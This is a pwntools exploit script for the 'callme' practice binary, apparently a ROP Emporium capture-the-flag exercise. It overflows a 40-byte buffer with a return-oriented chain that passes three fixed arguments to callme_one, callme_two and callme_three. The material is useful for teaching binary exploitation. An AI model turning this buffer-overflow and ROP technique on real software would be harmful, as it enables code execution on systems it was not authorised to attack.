from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *0x00000000004008f1
continue
'''.format(**locals())

exe = './callme'
elf = context.binary = ELF(exe, checksec=False)
p = start()

ret = 0x00000000004008f1
# ===== Exploit script here =====

arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

p.sendlineafter(b'> ', flat(
    b'A'*40,
    elf.sym['usefulGadgets'],
    arg1,
    arg2,
    arg3,
    ret,
    elf.plt['callme_one'],
    elf.sym['usefulGadgets'],
    arg1,
    arg2,
    arg3,
    ret,
    elf.plt['callme_two'],
    elf.sym['usefulGadgets'],
    arg1,
    arg2,
    arg3,
    ret,
    elf.plt['callme_three']
))
p.interactive()